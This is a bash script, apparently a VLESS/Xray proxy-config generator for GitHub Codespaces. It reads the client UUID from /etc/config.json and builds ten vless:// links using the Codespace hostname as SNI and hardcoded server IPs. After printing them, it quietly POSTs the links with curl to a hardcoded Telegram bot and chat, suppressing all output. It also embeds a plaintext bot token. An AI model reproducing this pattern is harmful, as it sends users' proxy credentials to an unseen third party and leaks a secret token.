#!/bin/bash

CONFIG="/etc/config.json"

UUID=$(jq -r '.inbounds[0].settings.clients[0].id' "$CONFIG")

if [ -z "$UUID" ] || [ "$UUID" = "null" ]; then
  echo "[g2ray] UUID not found."
  exit 1
fi

SNI="${CODESPACE_NAME}-443.app.github.dev"

KINGS=(
  "CyrusTheGreat"
  "Cambyses"
  "DariusTheGreat"
  "Xerxes"
  "Artaxerxes"
  "DariusII"
  "ArtaxerxesII"
  "ArtaxerxesIII"
  "ArdashirI"
  "ShapurI"
  "ShapurII"
  "KhosrowI"
  "KhosrowII"
  "Hormizd"
  "YazdegerdI"
  "YazdegerdIII"
)

KING=${KINGS[$RANDOM % ${#KINGS[@]}]}
RANDOM_ID=$(shuf -i 1000-9999 -n 1)

NAME="${KING}-${RANDOM_ID}"

LINK="
✅ Done ! Successful Create 
 
🌠 Your Config  :

vless://${UUID}@94.130.33.41:443?encryption=none&security=tls&type=xhttp&mode=packet-up&sni=${SNI}&path=%2F#Pain_Ultimate1

vless://${UUID}@144.76.1.88:443?encryption=none&security=tls&type=xhttp&mode=packet-up&sni=${SNI}&path=%2F#Pain_Ultimate2

vless://${UUID}@142.54.178.211:443?encryption=none&security=tls&type=xhttp&mode=packet-up&sni=${SNI}&path=%2F#Pain_Ultimate3

vless://${UUID}@138.201.54.122:443?encryption=none&security=tls&type=xhttp&mode=packet-up&sni=${SNI}&path=%2F#Pain_Ultimate4

vless://${UUID}@144.76.1.88:443?encryption=none&security=tls&type=xhttp&mode=packet-up&sni=${SNI}&path=%2F#Pain_Ultimate5

vless://${UUID}@94.130.50.12:443?encryption=none&security=tls&type=xhttp&mode=packet-up&sni=${SNI}&path=%2F#Pain_Ultimate6

vless://${UUID}@204.12.196.34:443?encryption=none&security=tls&type=xhttp&mode=packet-up&sni=${SNI}&path=%2F#Pain_Ultimate7

vless://${UUID}@65.109.34.234:443?encryption=none&security=tls&type=xhttp&mode=packet-up&sni=${SNI}&path=%2F#Pain_Ultimate8

vless://${UUID}@94.130.13.19:443?encryption=none&security=tls&type=xhttp&mode=packet-up&sni=${SNI}&path=%2F#Pain_Ultimate9

vless://${UUID}@94.130.13.19:443?encryption=none&security=tls&type=xhttp&mode=packet-up&sni=${SNI}&path=%2F#ِPain_Ultimate10


@ThoseWhoAreNoLongerAmongUs"
echo ""
echo "================================================"
echo "  $LINK"
echo "================================================"
echo ""

# SEND TO TELEGRAM
BOT_TOKEN="7843429722:AAGdb4texe8cErPbQycGsGzK2_4vpZiM0SI"
CHAT_ID="6920695217"

curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
  -d chat_id="${CHAT_ID}" \
  --data-urlencode text="$LINK" > /dev/null 2>&1
